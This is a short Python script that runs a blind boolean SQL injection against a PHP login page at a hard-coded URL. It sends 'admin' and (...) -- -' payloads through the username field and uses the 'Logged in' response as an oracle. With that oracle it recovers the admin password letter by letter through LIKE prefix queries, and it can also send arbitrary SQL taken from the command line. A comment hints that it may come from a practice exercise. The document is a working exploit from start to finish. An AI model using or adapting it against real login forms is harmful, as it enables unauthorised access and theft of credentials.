import requests
import sys

BASEURL = "http://frechetta.me/php/login.php"  # Input the URL running the .php file that connects to db

SESSION = requests.Session()

TRUE = "Logged in"
def postURL(url, data):
	return SESSION.post(format(url), data).text

def evaluateCondition(cond):
	payload = "admin' and (%s) -- -" % cond  # Does this SQL format look familar?
	response = postURL(BASEURL, {"username" : payload})

	#print response
	return TRUE in response

def evaluateSQL(cond):
	payload = cond  
	response = postURL(BASEURL, {"username" : payload})

	#print response
	return TRUE in response

def exploitSQL(): # Loops SQL injection 'password LIKE y%' until password is found!
	password = ""
	alphabet = "abcdefghijklmnopqrstuvwxyz"

	query = "password LIKE "
	passthrough = False
	while(not passthrough):
		for i in alphabet:
			format = "'" + password + i + "%" + "'"
			if evaluateCondition(query + format):
				password += i
				print True;
				break;
			if i == alphabet[-1]:
				passthrough = True
	return password
	
print evaluateSQL(sys.argv[1])
#print exploitSQL() 
